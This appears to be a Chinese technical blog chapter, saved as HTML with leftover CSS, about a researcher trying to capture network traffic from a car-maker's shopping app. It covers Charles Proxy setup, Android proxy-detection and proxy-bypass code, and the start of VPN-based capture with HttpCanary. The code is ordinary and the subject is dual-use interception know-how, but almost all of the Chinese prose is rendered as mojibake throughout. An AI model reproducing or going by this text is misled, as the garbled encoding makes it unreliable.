ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åºç« ï¼šå½“æŠ“åŒ…å·¥å…·é‡ä¸Š"é“œå¢™é“å£"</h2>
<blockquote>
<p><strong>æœ¬ç« å­—æ•°ï¼šçº¦5500å­—</strong>
<strong>é˜…è¯»æ—¶é—´ï¼šçº¦18åˆ†é’Ÿ</strong>
<strong>éš¾åº¦ç­‰çº§ï¼šâ˜…â˜…â˜†â˜†â˜†</strong></p>
<p><strong>å£°æ˜</strong>ï¼šæœ¬æ–‡ä¸­çš„å…¬å¸åç§°ã€åŒ…åã€APIåœ°å€ã€å¯†é’¥ç­‰å‡å·²è„±æ•å¤„ç†ï¼Œä½¿ç”¨è™šæ„åç§°æ›¿ä»£ã€‚"æ¢¦æƒ³ä¸–ç•Œ"ã€"dreamworld"ç­‰å‡ä¸ºè™šæ„åç§°ï¼Œä¸ä»»ä½•çœŸå®å…¬å¸æ— å…³ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>2026å¹´1æœˆ5æ—¥ï¼Œæ·±å¤œ23:15ã€‚</p>
<p>å®éªŒå®¤é‡Œåªæœ‰æ˜¾ç¤ºå™¨çš„å¾®å…‰å’Œå’–å•¡æœºå¶å°”å‘å‡ºçš„å’•å™œå£°ã€‚æˆ‘ååœ¨å·¥ä½å‰ï¼Œæ‰‹æŒ‡åœ¨é”®ç›˜ä¸Šè½»è½»æ•²å‡»ï¼Œå±å¹•ä¸Šçš„Charles Proxyæ­£åœ¨ç­‰å¾…è¿æ¥ã€‚ä½œä¸ºä¸€åæœ‰åå¹´ç»éªŒçš„å®‰å…¨ç ”ç©¶å‘˜ï¼Œæˆ‘å·²ç»ä¹ æƒ¯äº†æ·±å¤œçš„å·¥ä½œèŠ‚å¥ï¼Œä¹Ÿä¹ æƒ¯äº†å„ç§APPçš„å®‰å…¨é˜²æŠ¤æªæ–½ã€‚</p>
<p>ä½†ä»Šæ™šï¼Œæˆ‘å³å°†é‡åˆ°ä¸€ä¸ªè®©æˆ‘æ•´æ•´å›°æ‰°å¤šå¤©çš„å¯¹æ‰‹ã€‚</p>
<p>è¿™æ¬¾APPæ¥è‡ªå›½å†…æŸçŸ¥åæ–°èƒ½æºè½¦ä¼ï¼Œå†…éƒ¨ä»£å·ä¸º"dw_mall_shop"ï¼Œå¯¹å¤–æ˜¾ç¤ºä¸º"æ¢¦æƒ³ä¸–ç•Œ"ï¼Œå½“å‰ç‰ˆæœ¬v8.x.xã€‚æˆ‘ä¹‹æ‰€ä»¥é€‰æ‹©è¿™æ¬¾APPè¿›è¡Œå®‰å…¨æµ‹è¯•ï¼Œæ˜¯å› ä¸ºè¿‘å¹´æ¥è½¦ä¼APPçš„æ•°æ®å®‰å…¨é—®é¢˜æ—¥ç›Šçªå‡ºã€‚</p>
<p>ç”¨æˆ·çš„è½¦è¾†æ•°æ®ã€è¡Œé©¶è½¨è¿¹ã€ä¸ªäººä¿¡æ¯éƒ½é€šè¿‡è¿™ç±»APPè¿›è¡Œä¼ è¾“ï¼Œå…¶å®‰å…¨é˜²æŠ¤æ°´å¹³ç›´æ¥å…³ç³»åˆ°ç”¨æˆ·çš„éšç§å’Œè´¢äº§å®‰å…¨ã€‚ä½œä¸ºå®‰å…¨ç ”ç©¶å‘˜ï¼Œè¯„ä¼°è¿™ç±»APPçš„å®‰å…¨æ€§æ˜¯æˆ‘ä»¬çš„èŒè´£æ‰€åœ¨ã€‚</p>
<hr/>
<h3 data-id="heading-2">1.1 ç¬¬ä¸€æ¬¡å°è¯•ï¼šå¸¸è§„æŠ“åŒ…</h3>
<p>æŒ‰ç…§å¸¸è§„æµç¨‹ï¼Œæˆ‘çš„ç¬¬ä¸€æ­¥æ˜¯è¿›è¡ŒæŠ“åŒ…åˆ†æï¼Œäº†è§£APPä¸æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡åè®®å’Œæ•°æ®æ ¼å¼ã€‚è¿™æ˜¯é€†å‘å·¥ç¨‹çš„åŸºç¡€â€”â€”åªæœ‰äº†è§£äº†æ•°æ®æ˜¯å¦‚ä½•ä¼ è¾“çš„ï¼Œæ‰èƒ½è¿›ä¸€æ­¥åˆ†ææ•°æ®æ˜¯å¦‚ä½•ç”Ÿæˆçš„ã€‚</p>
<p>æˆ‘ç†Ÿç»ƒåœ°å®Œæˆäº†æŠ“åŒ…ç¯å¢ƒçš„é…ç½®ï¼š</p>
<h4 data-id="heading-3">1.1.1 ç¯å¢ƒå‡†å¤‡</h4>
<p><strong>æµ‹è¯•è®¾å¤‡</strong>ï¼š</p>
<ul>
<li>æ‰‹æœºï¼šPixel 6 Proï¼ŒAndroid 13</li>
<li>ç”µè„‘ï¼šMacBook Pro M2ï¼ŒmacOS Ventura</li>
<li>æŠ“åŒ…å·¥å…·ï¼šCharles Proxy 4.6.4</li>
</ul>
<p><strong>é…ç½®æ­¥éª¤</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å¯åŠ¨Charles Proxy</span>
<span class="hljs-comment"># é»˜è®¤ç›‘å¬ç«¯å£ï¼š8888</span>

<span class="hljs-comment"># 2. åœ¨æ‰‹æœºä¸Šé…ç½®WiFiä»£ç†</span>
<span class="hljs-comment"># è®¾ç½® -&gt; WiFi -&gt; å½“å‰ç½‘ç»œ -&gt; ä»£ç† -&gt; æ‰‹åŠ¨</span>
<span class="hljs-comment"># æœåŠ¡å™¨ï¼šç”µè„‘IPåœ°å€</span>
<span class="hljs-comment"># ç«¯å£ï¼š8888</span>

<span class="hljs-comment"># 3. å®‰è£…Charlesæ ¹è¯ä¹¦</span>
<span class="hljs-comment"># åœ¨æ‰‹æœºæµè§ˆå™¨è®¿é—® chls.pro/ssl</span>
<span class="hljs-comment"># ä¸‹è½½å¹¶å®‰è£…è¯ä¹¦</span>
<span class="hljs-comment"># è®¾ç½® -&gt; å®‰å…¨ -&gt; åŠ å¯†ä¸å‡­æ® -&gt; å®‰è£…è¯ä¹¦</span>
</code></pre>
<p><strong>éªŒè¯é…ç½®</strong>ï¼š</p>
<p>ä¸ºäº†ç¡®è®¤ä»£ç†é…ç½®æ­£ç¡®ï¼Œæˆ‘å…ˆç”¨æ‰‹æœºæµè§ˆå™¨è®¿é—®äº†å‡ ä¸ªç½‘ç«™ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">âœ“ https:<span class="hljs-comment">//www.baidu.com - CharlesæˆåŠŸæ•è·</span>
âœ“ https:<span class="hljs-comment">//www.google.com - CharlesæˆåŠŸæ•è·</span>
âœ“ https:<span class="hljs-comment">//api.github.com - CharlesæˆåŠŸæ•è·</span>
</code></pre>
<p>ä¸€åˆ‡æ­£å¸¸ã€‚ä»£ç†é…ç½®æ²¡æœ‰é—®é¢˜ã€‚</p>
<h4 data-id="heading-4">1.1.2 å¯åŠ¨ç›®æ ‡APP</h4>
<p>æ·±å¸ä¸€å£æ°”ï¼Œæˆ‘ç‚¹å‡»äº†"æ¢¦æƒ³ä¸–ç•Œ"çš„å›¾æ ‡ã€‚</p>
<p>APPæ­£å¸¸å¯åŠ¨äº†ã€‚å¯åŠ¨ç”»é¢ã€åŠ è½½åŠ¨ç”»ã€ä¸»ç•Œé¢â€”â€”ä¸€åˆ‡çœ‹èµ·æ¥éƒ½å¾ˆæ­£å¸¸ã€‚æˆ‘å¼€å§‹åœ¨APPä¸­è¿›è¡Œå„ç§æ“ä½œï¼š</p>
<ul>
<li>æµè§ˆå•†åŸé¦–é¡µ</li>
<li>æŸ¥çœ‹å•†å“è¯¦æƒ…</li>
<li>æœç´¢å•†å“</li>
<li>æŸ¥çœ‹ä¸ªäººä¸­å¿ƒ</li>
</ul>
<p>APPå“åº”æµç•…ï¼Œæ•°æ®åŠ è½½æ­£å¸¸ï¼Œå›¾ç‰‡æ˜¾ç¤ºæ¸…æ™°ã€‚ä»ç”¨æˆ·ä½“éªŒçš„è§’åº¦æ¥çœ‹ï¼Œè¿™æ˜¯ä¸€æ¬¾éå¸¸ä¼˜ç§€çš„APPã€‚</p>
<p><strong>ç„¶è€Œï¼Œå½“æˆ‘åˆ‡æ¢åˆ°Charlesçª—å£æ—¶ï¼Œæˆ‘æ„£ä½äº†ã€‚</strong></p>
<p>Charlesçš„è¯·æ±‚åˆ—è¡¨â€”â€”<strong>ç©ºç©ºå¦‚ä¹Ÿ</strong>ã€‚</p>
<p>æ²¡æœ‰ä»»ä½•HTTPè¯·æ±‚ã€‚æ²¡æœ‰ä»»ä½•HTTPSè¯·æ±‚ã€‚ä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚</p>
<p>æˆ‘ä»¥ä¸ºæ˜¯è‡ªå·±çœ¼èŠ±äº†ï¼Œæ‰äº†æ‰çœ¼ç›ï¼Œä»”ç»†çœ‹äº†çœ‹å±å¹•ã€‚ç¡®å®æ˜¯ç©ºçš„ã€‚</p>
<h4 data-id="heading-5">1.1.3 æ’æŸ¥é—®é¢˜</h4>
<p>"ä¸å¯èƒ½å•Šï¼Œ"æˆ‘è‡ªè¨€è‡ªè¯­é“ï¼Œ"APPæ˜æ˜åœ¨æ­£å¸¸åŠ è½½æ•°æ®ï¼Œæ€ä¹ˆå¯èƒ½æ²¡æœ‰ç½‘ç»œè¯·æ±‚ï¼Ÿ"</p>
<p>æˆ‘å¼€å§‹æ’æŸ¥å¯èƒ½çš„é—®é¢˜ï¼š</p>
<p><strong>æ£€æŸ¥1ï¼šä»£ç†é…ç½®</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨æ‰‹æœºä¸Šç¡®è®¤ä»£ç†è®¾ç½®</span>
è®¾ç½® -&gt; WiFi -&gt; å½“å‰ç½‘ç»œ -&gt; ä»£ç†
<span class="hljs-comment"># æ˜¾ç¤ºï¼šæ‰‹åŠ¨ï¼ŒæœåŠ¡å™¨ï¼š192.168.1.100ï¼Œç«¯å£ï¼š8888</span>
<span class="hljs-comment"># é…ç½®æ­£ç¡® âœ“</span>
</code></pre>
<p><strong>æ£€æŸ¥2ï¼šCharlesç›‘å¬çŠ¶æ€</strong></p>
<pre><code class="hljs language-bash" lang="bash">Charles -&gt; Proxy -&gt; Proxy Settings
<span class="hljs-comment"># ç«¯å£ï¼š8888</span>
<span class="hljs-comment"># å¯ç”¨é€æ˜ä»£ç†ï¼šæ˜¯</span>
<span class="hljs-comment"># çŠ¶æ€æ­£å¸¸ âœ“</span>
</code></pre>
<p><strong>æ£€æŸ¥3ï¼šè¯ä¹¦å®‰è£…</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨æ‰‹æœºä¸Šç¡®è®¤è¯ä¹¦</span>
è®¾ç½® -&gt; å®‰å…¨ -&gt; åŠ å¯†ä¸å‡­æ® -&gt; ç”¨æˆ·å‡­æ®
<span class="hljs-comment"># æ˜¾ç¤ºï¼šCharles Proxy CA</span>
<span class="hljs-comment"># è¯ä¹¦å·²å®‰è£… âœ“</span>
</code></pre>
<p><strong>æ£€æŸ¥4ï¼šå…¶ä»–APPæµ‹è¯•</strong></p>
<p>æˆ‘æ‰“å¼€äº†æ‰‹æœºä¸Šçš„å…¶ä»–å‡ ä¸ªAPPè¿›è¡Œæµ‹è¯•ï¼š</p>
<pre><code class="hljs">âœ“ å¾®ä¿¡ - CharlesæˆåŠŸæ•è·è¯·æ±‚
âœ“ æ·˜å® - CharlesæˆåŠŸæ•è·è¯·æ±‚
âœ“ æŠ–éŸ³ - CharlesæˆåŠŸæ•è·è¯·æ±‚
</code></pre>
<p>å…¶ä»–APPéƒ½èƒ½æ­£å¸¸æŠ“åŒ…ï¼Œåªæœ‰"æ¢¦æƒ³ä¸–ç•Œ"æŠ“ä¸åˆ°ã€‚</p>
<p><strong>è¿™è¯´æ˜é—®é¢˜å‡ºåœ¨APPæœ¬èº«ï¼Œè€Œä¸æ˜¯æˆ‘çš„æŠ“åŒ…ç¯å¢ƒã€‚</strong></p>
<hr/>
<h3 data-id="heading-6">1.2 æ·±å…¥åˆ†æï¼šä¸ºä»€ä¹ˆæŠ“ä¸åˆ°ï¼Ÿ</h3>
<h4 data-id="heading-7">1.2.1 æ’é™¤SSL Pinning</h4>
<p>æˆ‘çš„ç¬¬ä¸€ååº”æ˜¯ï¼šè¿™å¯èƒ½æ˜¯SSL Pinningå¯¼è‡´çš„ã€‚</p>
<p>SSL Pinningï¼ˆè¯ä¹¦é”å®šï¼‰æ˜¯ä¸€ç§å¸¸è§çš„å®‰å…¨æªæ–½ï¼ŒAPPä¼šéªŒè¯æœåŠ¡å™¨è¯ä¹¦æ˜¯å¦ä¸é¢„æœŸçš„è¯ä¹¦åŒ¹é…ã€‚å¦‚æœä¸åŒ¹é…ï¼ˆæ¯”å¦‚ä½¿ç”¨äº†Charlesçš„ä»£ç†è¯ä¹¦ï¼‰ï¼Œå°±ä¼šæ‹’ç»è¿æ¥ã€‚</p>
<p>ä½†æ˜¯ï¼ŒSSL Pinningé€šå¸¸ä¼šå¯¼è‡´ä»¥ä¸‹ç°è±¡ï¼š</p>
<ul>
<li>APPæ˜¾ç¤ºç½‘ç»œé”™è¯¯</li>
<li>APPæç¤º"æ— æ³•è¿æ¥åˆ°æœåŠ¡å™¨"</li>
<li>Charlesä¸­æ˜¾ç¤ºSSLæ¡æ‰‹å¤±è´¥</li>
</ul>
<p>è€Œæˆ‘è§‚å¯Ÿåˆ°çš„ç°è±¡æ˜¯ï¼š</p>
<ul>
<li>APPæ­£å¸¸è¿è¡Œ</li>
<li>æ•°æ®æ­£å¸¸åŠ è½½</li>
<li>Charlesä¸­ä»€ä¹ˆéƒ½æ²¡æœ‰</li>
</ul>
<p><strong>è¿™ä¸åƒæ˜¯SSL Pinningçš„è¡¨ç°ã€‚</strong></p>
<h4 data-id="heading-8">1.2.2 ä¸€ä¸ªå…³é”®å‘ç°</h4>
<p>å°±åœ¨æˆ‘ç™¾æ€ä¸å¾—å…¶è§£çš„æ—¶å€™ï¼Œæˆ‘æƒ³èµ·äº†ä¸€ä»¶äº‹ã€‚</p>
<p>å‰å‡ å¤©ï¼Œæˆ‘åœ¨è¿™å°æ‰‹æœºä¸Šå®‰è£…äº†ä¸€æ¬¾ç§‘å­¦ä¸Šç½‘å·¥å…·ï¼ˆç±»ä¼¼VPNçš„ä»£ç†è½¯ä»¶ï¼‰ï¼Œç”¨äºè®¿é—®ä¸€äº›å›½å¤–çš„æŠ€æœ¯æ–‡æ¡£ã€‚è¿™æ¬¾å·¥å…·ä½¿ç”¨çš„æ˜¯SOCKS5ä»£ç†åè®®ã€‚</p>
<p>æˆ‘çªç„¶å¥½å¥‡ï¼šå¦‚æœå¼€å¯è¿™ä¸ªç§‘å­¦ä¸Šç½‘å·¥å…·ï¼Œ"æ¢¦æƒ³ä¸–ç•Œ"APPè¿˜èƒ½æ­£å¸¸ä½¿ç”¨å—ï¼Ÿ</p>
<p>æˆ‘æ‰“å¼€äº†ç§‘å­¦ä¸Šç½‘å·¥å…·ï¼Œç„¶åå¯åŠ¨"æ¢¦æƒ³ä¸–ç•Œ"APPã€‚</p>
<p><strong>APPå®Œå…¨æ­£å¸¸ï¼</strong></p>
<p>æ•°æ®åŠ è½½æ­£å¸¸ï¼ŒåŠŸèƒ½ä½¿ç”¨æ­£å¸¸ï¼Œæ²¡æœ‰ä»»ä½•å¼‚å¸¸æç¤ºã€‚</p>
<p>è¿™ä¸ªå‘ç°è®©æˆ‘é™·å…¥äº†æ²‰æ€ã€‚</p>
<h4 data-id="heading-9">1.2.3 ä»£ç†ç±»å‹çš„å·®å¼‚</h4>
<p>è®©æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ä¸åŒä»£ç†ç±»å‹çš„å·¥ä½œåŸç†ï¼š</p>
<p><strong>HTTPä»£ç†ï¼ˆCharlesä½¿ç”¨ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”    HTTPè¯·æ±‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”    HTTPè¯·æ±‚    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   APP   â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; â”‚  Charles â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; â”‚  æœåŠ¡å™¨  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">                               â”‚
                          è§£æHTTPåè®®
                          è®°å½•è¯·æ±‚å†…å®¹
</span></code></pre>
<p><strong>SOCKS5ä»£ç†ï¼ˆç§‘å­¦ä¸Šç½‘å·¥å…·ä½¿ç”¨ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”    TCPè¿æ¥     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”    TCPè¿æ¥     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   APP   â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; â”‚  SOCKS5  â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; â”‚  æœåŠ¡å™¨  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">                               â”‚
                          åªè½¬å‘TCPæ•°æ®
                          ä¸è§£æåº”ç”¨å±‚åè®®
</span></code></pre>
<p><strong>å…³é”®åŒºåˆ«</strong>ï¼š</p>
<ul>
<li>HTTPä»£ç†å·¥ä½œåœ¨åº”ç”¨å±‚ï¼ˆç¬¬7å±‚ï¼‰ï¼Œéœ€è¦è§£æHTTPåè®®</li>
<li>SOCKS5ä»£ç†å·¥ä½œåœ¨ä¼šè¯å±‚ï¼ˆç¬¬5å±‚ï¼‰ï¼Œåªè´Ÿè´£è½¬å‘TCPæ•°æ®</li>
</ul>
<p><strong>è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</strong></p>
<p>APPå¯èƒ½å®ç°äº†è¿™æ ·çš„é€»è¾‘ï¼š</p>
<ol>
<li>æ£€æµ‹ç³»ç»Ÿæ˜¯å¦è®¾ç½®äº†HTTPä»£ç†</li>
<li>å¦‚æœæ£€æµ‹åˆ°HTTPä»£ç†ï¼Œå°±ç»•è¿‡ç³»ç»Ÿç½‘ç»œæ ˆï¼Œä½¿ç”¨è‡ªå®šä¹‰çš„ç½‘ç»œé€šä¿¡æ–¹å¼</li>
<li>å¦‚æœæ²¡æœ‰æ£€æµ‹åˆ°HTTPä»£ç†ï¼ˆæˆ–è€…æ˜¯SOCKSä»£ç†ï¼‰ï¼Œå°±æ­£å¸¸é€šä¿¡</li>
</ol>
<p>è¿™æ˜¯ä¸€ç§<strong>ç²¾å‡†æ‰“å‡»</strong>çš„ç­–ç•¥ï¼š</p>
<ul>
<li>é’ˆå¯¹å®‰å…¨ç ”ç©¶å‘˜çš„æŠ“åŒ…å·¥å…·ï¼ˆHTTPä»£ç†ï¼‰ï¼šå®Œå…¨å¤±æ•ˆ</li>
<li>é’ˆå¯¹æ™®é€šç”¨æˆ·çš„ç§‘å­¦ä¸Šç½‘éœ€æ±‚ï¼ˆSOCKSä»£ç†ï¼‰ï¼šæ­£å¸¸ä½¿ç”¨</li>
</ul>
<p><strong>å¤ªç²¾å¦™äº†ï¼</strong></p>
<hr/>
<h3 data-id="heading-10">1.3 éªŒè¯å‡è®¾ï¼šä»£ç†æ£€æµ‹æœºåˆ¶</h3>
<h4 data-id="heading-11">1.3.1 ç³»ç»Ÿä»£ç†æ£€æµ‹</h4>
<p>åœ¨Androidç³»ç»Ÿä¸­ï¼ŒHTTPä»£ç†è®¾ç½®å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è·å–ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ–¹æ³•1ï¼šé€šè¿‡System.getPropertyè·å–</span>
<span class="hljs-type">String</span> <span class="hljs-variable">proxyHost</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">"http.proxyHost"</span>);
<span class="hljs-type">String</span> <span class="hljs-variable">proxyPort</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">"http.proxyPort"</span>);

<span class="hljs-comment">// æ–¹æ³•2ï¼šé€šè¿‡ProxySelectorè·å–</span>
<span class="hljs-type">ProxySelector</span> <span class="hljs-variable">selector</span> <span class="hljs-operator">=</span> ProxySelector.getDefault();
List&lt;Proxy&gt; proxies = selector.select(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URI</span>(<span class="hljs-string">"https://api.example.com"</span>));

<span class="hljs-comment">// æ–¹æ³•3ï¼šé€šè¿‡ConnectivityManagerè·å–ï¼ˆAndroidç‰¹æœ‰ï¼‰</span>
<span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
<span class="hljs-type">ProxyInfo</span> <span class="hljs-variable">proxyInfo</span> <span class="hljs-operator">=</span> cm.getDefaultProxy();
</code></pre>
<p>å¦‚æœAPPåœ¨å‘èµ·ç½‘ç»œè¯·æ±‚ä¹‹å‰æ£€æµ‹è¿™äº›å€¼ï¼Œå°±èƒ½çŸ¥é“ç³»ç»Ÿæ˜¯å¦è®¾ç½®äº†HTTPä»£ç†ã€‚</p>
<h4 data-id="heading-12">1.3.2 WiFiä»£ç†æ£€æµ‹</h4>
<p>é™¤äº†ç³»ç»Ÿçº§åˆ«çš„ä»£ç†è®¾ç½®ï¼ŒAndroidè¿˜æ”¯æŒé’ˆå¯¹ç‰¹å®šWiFiç½‘ç»œè®¾ç½®ä»£ç†ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–å½“å‰WiFié…ç½®</span>
<span class="hljs-type">WifiManager</span> <span class="hljs-variable">wifiManager</span> <span class="hljs-operator">=</span> (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
<span class="hljs-type">WifiInfo</span> <span class="hljs-variable">wifiInfo</span> <span class="hljs-operator">=</span> wifiManager.getConnectionInfo();
<span class="hljs-type">WifiConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> getWifiConfiguration(wifiInfo.getNetworkId());

<span class="hljs-comment">// æ£€æŸ¥ä»£ç†è®¾ç½®</span>
<span class="hljs-keyword">if</span> (config.getProxySettings() == ProxySettings.STATIC) {
    <span class="hljs-type">ProxyInfo</span> <span class="hljs-variable">proxyInfo</span> <span class="hljs-operator">=</span> config.getHttpProxy();
    <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> proxyInfo.getHost();
    <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> proxyInfo.getPort();
    <span class="hljs-comment">// æ£€æµ‹åˆ°ä»£ç†ï¼</span>
}
</code></pre>
<h4 data-id="heading-13">1.3.3 ç»•è¿‡ä»£ç†çš„æ–¹æ³•</h4>
<p>ä¸€æ—¦æ£€æµ‹åˆ°ä»£ç†ï¼ŒAPPå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ç»•è¿‡ï¼š</p>
<p><strong>æ–¹æ³•1ï¼šä½¿ç”¨NO_PROXY</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºä¸ä½¿ç”¨ä»£ç†çš„OkHttpClient</span>
<span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>.Builder()
    .proxy(Proxy.NO_PROXY)  <span class="hljs-comment">// æ˜ç¡®æŒ‡å®šä¸ä½¿ç”¨ä»£ç†</span>
    .build();
</code></pre>
<p><strong>æ–¹æ³•2ï¼šè‡ªå®šä¹‰SocketFactory</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºç›´è¿çš„Socketï¼Œç»•è¿‡ç³»ç»Ÿä»£ç†</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectSocketFactory</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SocketFactory</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Socket <span class="hljs-title function_">createSocket</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>();
        <span class="hljs-comment">// ç›´æ¥è¿æ¥ï¼Œä¸ç»è¿‡ä»£ç†</span>
        <span class="hljs-keyword">return</span> socket;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Socket <span class="hljs-title function_">createSocket</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>();
        socket.connect(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(host, port));
        <span class="hljs-keyword">return</span> socket;
    }
}
</code></pre>
<p><strong>æ–¹æ³•3ï¼šä½¿ç”¨è‡ªå®šä¹‰DNS</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç»•è¿‡ç³»ç»ŸDNSï¼Œç›´æ¥ä½¿ç”¨IPåœ°å€</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectDns</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Dns</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> List&lt;InetAddress&gt; <span class="hljs-title function_">lookup</span><span class="hljs-params">(String hostname)</span> <span class="hljs-keyword">throws</span> UnknownHostException {
        <span class="hljs-comment">// ä½¿ç”¨ç¡¬ç¼–ç çš„IPåœ°å€ï¼Œæˆ–è€…è‡ªå®šä¹‰DNSæœåŠ¡å™¨</span>
        <span class="hljs-keyword">if</span> (hostname.equals(<span class="hljs-string">"api.dreamworld.com"</span>)) {
            <span class="hljs-keyword">return</span> Arrays.asList(InetAddress.getByName(<span class="hljs-string">"1.2.3.4"</span>));
        }
        <span class="hljs-keyword">return</span> Dns.SYSTEM.lookup(hostname);
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-14">1.4 æ›´å¤šå°è¯•ï¼šå¯»æ‰¾çªç ´å£</h3>
<h4 data-id="heading-15">1.4.1 VPNæŠ“åŒ…</h4>
<p>æ—¢ç„¶HTTPä»£ç†ä¸è¡Œï¼Œæˆ‘å°è¯•ä½¿ç”¨VPNæ–¹å¼æŠ“åŒ…ã€‚</p>
<p><strong>å·¥å…·ï¼šHttpCanary</strong></p>
<p>HttpCanaryæ˜¯ä¸€æ¬¾Androidå¹³å°çš„æŠ“åŒ…å·¥å…·ï¼Œå®ƒé€šè¿‡åˆ›å»ºæœ¬åœ°VPNæ¥æ•è·æ‰€æœ‰ç½‘ç»œæµé‡ã€‚</p>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”    æ‰€æœ‰æµé‡    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    è½¬å‘    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   APP   â”‚ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; â”‚ HttpCanary  â”‚ â”€â”€â”€â”€â”€â”€â”€â”€&gt; â”‚  æœåŠ¡å™¨  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚   (VPN)     â”‚           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">                          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                â”‚
                           æ•è·æ‰€æœ‰æµé‡
